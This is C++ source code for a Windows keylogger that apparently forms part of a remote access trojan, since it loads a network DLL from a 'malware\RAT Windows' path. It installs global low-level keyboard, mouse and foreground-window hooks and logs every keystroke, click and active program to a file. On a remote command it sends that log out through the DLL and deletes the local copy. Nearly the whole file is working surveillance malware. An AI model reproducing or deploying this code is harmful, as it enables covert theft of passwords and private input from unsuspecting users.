//cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib /OUT:keylogger.exe
#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <mutex>
#include <codecvt>
#include <vector>

using namespace std;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef string (*RecvDataFunc)(const std::string&);
typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

LPCSTR dllPath = "C:\\malware\\RAT Windows\\network_lib.dll";
HINSTANCE hDLL;

bool running = true;

HWINEVENTHOOK hook;
HHOOK keyboardHook;
HHOOK mouseHook;                                                               //cpy&paste buffer

std::ofstream outputFile("keystrokes.txt", std::ios::app);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL CtrlHandler(DWORD fdwCtrlType);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

std::string readFile(const std::string& filename)
{
  std::ifstream file(filename);
  if (!file.is_open())
  {
    std::cerr << "Error: Could not open file '" << filename << "'" << std::endl;
    return ""; 
  }

  std::stringstream buffer;
  buffer << file.rdbuf(); 

  return buffer.str();
}

int load_dll()
{
    hDLL = LoadLibraryA(dllPath);
    if (hDLL == NULL)
    {
        printf("Failed to load DLL: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses.\n";
        FreeLibrary(hDLL);
        return 1;
    }

    return 0;
}

int main(int argc, char* argv[])
{
    std::atomic<bool> receivedTerminationSignal(false);
    
    if (load_dll() != 0)return 1;
    //cout << "DLL loaded successfully.\n";

    // Set the console control handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        std::cerr << "Error setting console control handler" << std::endl;
        return 1;
    }

    hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);

    HINSTANCE hInstance = GetModuleHandle(NULL);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance, 0);

    if (!hook || !keyboardHook || !mouseHook) 
    {
        std::cerr << "Failed to set one or more hooks." << std::endl;
        return 1;
    }

    // Create a thread to check for the termination signal
    std::thread terminationCheckThread([&]()
    {
        while (true)
        {
            string a = receive_data("klogger_cmd.txt");
            if (a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                string contents = readFile("keystrokes.txt");
                send_data("key_strokes.txt",contents);

                outputFile.close();
                remove("keystrokes.txt");

                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE))
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Join the termination check thread
    terminationCheckThread.join();

    UnhookWindowsHookEx(keyboardHook);
    UnhookWinEvent(hook);
    UnhookWindowsHookEx(mouseHook);
    outputFile.close();

    //std::cout << "Exiting program." << std::endl; //Confirmation message

    FreeLibrary(hDLL);
    //cout << "\nDll Unloaded.\n";

    return 0;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        running = false; // Set the flag to exit the loop
        return TRUE; // Indicate that the signal was handled
    default:
        return FALSE;
    }
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess)
        {
            char processName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
            {
                //cout << endl << "===============["<< processName << "]===============" << endl;
                outputFile << endl << "===============["<< processName << "]===============" << endl;
                outputFile.flush();
            }
            CloseHandle(hProcess);
        }
    }
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
        int x = mouseStruct->pt.x;
        int y = mouseStruct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
            {
                //std::wcout << L"\n[Left click (" << x << L", " << y << L")]\n";
                outputFile <<"\n[Left click("<< x <<", "<< y << ")]\n";
                outputFile.flush();
                break;
            }
            case WM_RBUTTONDOWN:
            {
                //std::wcout << L"\n[Right click (" << x << L", " << y << L")]\n";
                outputFile <<"\n[Right click("<< x <<", "<< y << ")]\n";
                outputFile.flush();
                break;
            }
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyState[256];
        GetKeyboardState(keyState);
        WCHAR outputChar[2] = { 0 };

        switch (wParam) // Switch on wParam (message type)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN: // Handle system key downs (Alt, etc.)
            {
                
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        //std::wcout << L"[Shift Pressed] ";
                        outputFile << "[Shift Pressed] ";
                        outputFile.flush();
                        break;
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        //std::wcout << L"[Control]";
                        outputFile << "[Control]";
                        outputFile.flush();
                        break;
                    case VK_LMENU:
                    case VK_RMENU:
                        //std::wcout << L"[Alt] ";
                        outputFile << "[Alt] ";
                        outputFile.flush();
                        break;
                    case VK_CAPITAL:
                        //std::wcout << L"[Caps Lock] ";
                        outputFile << "[Caps Lock] ";
                        outputFile.flush();
                        break;
                    case VK_BACK:
                        //std::wcout << L"[Backspace]";
                        outputFile << "[Backspace]";
                        outputFile.flush();
                        break;
                    case VK_TAB:
                        //std::wcout << L"[Tab] ";    
                        outputFile << "[Tab] ";
                        outputFile.flush();
                        break;
                    case VK_ESCAPE:
                        //std::wcout << L"[Escape] ";
                        outputFile << "[Escape] ";
                        outputFile.flush();
                        break;
                    case VK_RETURN:
                        //std::wcout << L"[Enter] ";
                        outputFile << "[Enter] ";
                        outputFile.flush();
                        break;
                    case VK_SPACE:
                        //std::wcout << L"[Space]";
                        outputFile << "[Space]";
                        outputFile.flush();
                        break;
                    case VK_LEFT:
                        //std::wcout << L"[<-] ";
                        outputFile << "[<-] ";
                        outputFile.flush();
                        break;
                    case VK_RIGHT:
                        //std::wcout << L"[->] ";
                        outputFile << "[->] ";
                        outputFile.flush();
                        break;
                    case VK_UP:
                        //std::wcout << L"[Up Arrow] ";
                        outputFile << "[Up Arrow] ";
                        outputFile.flush();
                        break;
                    case VK_DOWN:
                        //std::wcout << L"[Down Arrow] ";
                        outputFile << "[Down Arrow] ";
                        outputFile.flush();
                        break;
                    case VK_DELETE:
                        //std::wcout << L"[Del] ";
                        outputFile << "[Del] ";
                        outputFile.flush();
                        break;
                    case VK_INSERT:
                        //std::wcout << L"[Ins] ";
                        outputFile << "[Ins] ";
                        outputFile.flush();
                        break;
                    case VK_LWIN:
                    case VK_RWIN:
                        //std::wcout << L"[Windows] ";
                        outputFile << "[Windows] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD0:
                        //std::wcout << L"[NumPad 0] ";
                        outputFile << "[NumPad 0] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD1:
                        //std::wcout << L"[NumPad 1] ";
                        outputFile << "[NumPad 1] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD2:
                        //std::wcout << L"[NumPad 2] ";
                        outputFile << "[NumPad 2] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD3:
                        //std::wcout << L"[NumPad 3] ";
                        outputFile << "[NumPad 3] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD4:
                        //std::wcout << L"[NumPad 4] ";
                        outputFile << "[NumPad 4] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD5:
                        //std::wcout << L"[NumPad 5] ";
                        outputFile << "[NumPad 5] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD6:
                        //std::wcout << L"[NumPad 6] ";
                        outputFile << "[NumPad 6] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD7:
                        //std::wcout << L"[NumPad 7] ";
                        outputFile << "[NumPad 7] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD8:
                        //std::wcout << L"[NumPad 8] ";
                        outputFile << "[NumPad 8] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD9:
                        //std::wcout << L"[NumPad 9] ";
                        outputFile << "[NumPad 9] "; 
                        outputFile.flush();
                        break;
                    case VK_MULTIPLY:
                        //std::wcout << L"[NumPad Multiply] ";
                        outputFile << "[NumPad Multiply] "; 
                        outputFile.flush();
                        break;
                    case VK_ADD:
                        //std::wcout << L"[NumPad Add] ";
                        outputFile << "[NumPad Add] "; 
                        outputFile.flush();
                        break;
                    case VK_SEPARATOR:
                        //std::wcout << L"[NumPad Separator] ";
                        outputFile << "[NumPad Separator] "; 
                        outputFile.flush();
                        break;
                    case VK_SUBTRACT:
                        //std::wcout << L"[NumPad Subtract] ";
                        outputFile << "[NumPad Subtract] "; 
                        outputFile.flush();
                        break;
                    case VK_DECIMAL:
                        //std::wcout << L"[NumPad Decimal] ";
                        outputFile << "[NumPad Decimal] "; 
                        outputFile.flush();
                        break;
                    case VK_DIVIDE:
                        //std::wcout << L"[NumPad Divide] ";
                        outputFile << "[NumPad Divide] "; 
                        outputFile.flush();
                        break;
                    case VK_HOME:
                        //std::wcout << L"[Home] ";
                        outputFile << "[Home] "; 
                        outputFile.flush();
                        break;
                    case VK_END:
                        //std::wcout << L"[End] ";
                        outputFile << "[End] "; 
                        outputFile.flush();
                        break;
                    case VK_PRIOR:
                        //std::wcout << L"[Pg_up] ";
                        outputFile << "[Pg_up] "; 
                        outputFile.flush();
                        break;
                    case VK_NEXT:
                        //std::wcout << L"[Pg_down] ";
                        outputFile << "[Pg_down] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMLOCK:
                        //std::wcout << L"[Numlock] ";
                        outputFile << "[Numlock] "; 
                        outputFile.flush();
                        break;
                    case VK_SNAPSHOT:
                        //std::wcout << L"[Print_scr] ";
                        outputFile << "[Print_scr] "; 
                        outputFile.flush();
                        break;
                    default:
                    {
                        int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
                        if (result == 1) {
                            //std::wcout << outputChar[0] << L" "; 

                            // Convert wchar_t to UTF-8
                            std::string utf8Char(1, (char)outputChar[0]); 
                            outputFile << utf8Char; 
                        } else if (result > 1) { 
                            outputChar[result] = L'\0';
                            //std::wcout << outputChar << L" "; 

                            // Convert wchar_t string to UTF-8
                            std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
                            outputFile << utf8Char; 
                        } else {
                            //std::wcout << L"[unknown] ";
                            outputFile << "[unknown] "; 
                        }
                        outputFile.flush(); 
                        break;
                    }
                }
                break;
            }
            case WM_KEYUP:
            case WM_SYSKEYUP: // Handle system key ups
            {   
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    {
                        //std::wcout << L"[Shift Released] ";
                        outputFile << "[Shift Released] ";
                        outputFile.flush();
                        break;
                    }
                }
                break;
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
